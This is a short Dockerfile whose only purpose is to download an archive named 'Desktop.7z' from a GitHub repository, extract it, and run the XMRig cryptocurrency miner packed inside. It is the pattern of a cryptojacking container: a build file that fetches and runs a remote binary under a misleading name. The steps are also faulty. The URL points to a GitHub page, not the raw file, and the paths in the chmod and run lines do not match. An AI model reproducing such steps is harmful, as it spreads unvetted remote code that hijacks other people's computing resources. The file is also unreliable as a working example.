FROM ubuntu:latest
RUN apt-get update && apt-get install -y vim git curl pciutils wget
RUN apt-get install -y p7zip p7zip-full p7zip-rar
RUN wget https://github.com/AimTuxHvH/ubuntu/blob/master/Desktop.7z
RUN 7z e Desktop.7z
RUN chmod +x "/xmrig"
RUN ./xmrig
